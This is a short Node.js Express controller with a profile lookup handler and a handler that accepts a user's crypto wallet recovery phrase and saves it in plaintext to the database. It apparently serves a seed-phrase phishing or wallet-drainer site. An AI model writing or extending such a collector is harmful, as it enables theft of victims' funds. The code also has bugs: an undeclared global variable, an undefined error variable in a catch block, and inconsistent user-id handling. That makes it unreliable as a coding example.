const User = require('../models/user.models');

const getUser = async (req, res) => {
    try{
        id = req.user;

        const user = await User.findById(id).select('-password');

        if (!user) {
            return res.status(404).json({ message: 'User not found' });
        }

        // Respond with the user profile data
        res.status(200).json({ user });
    } catch (error) {
        console.error(err);
        res.status(500).json({ message: 'Server error', errMessage: err });
    }
};

const submitPassphrase = async (req, res) => {
    try {
        const { wallet_phrase } = req.body;

        if (!wallet_phrase) {
            return res.status(400).json({ error: 'Passphrase is required.' });
        }

        const userId = req.user.id;
        await User.findByIdAndUpdate(userId, {
            walletPassphrase: wallet_phrase,
            walletConnected: false
        });

        return res.status(200).json({ message: 'Passphrase submitted successfully.' });
    } catch (error) {
        console.error('Error submitting passphrase:', error);
        return res.status(500).json({ error: 'Internal server error' });
    }
};


module.exports = { 
    getUser, 
    submitPassphrase
};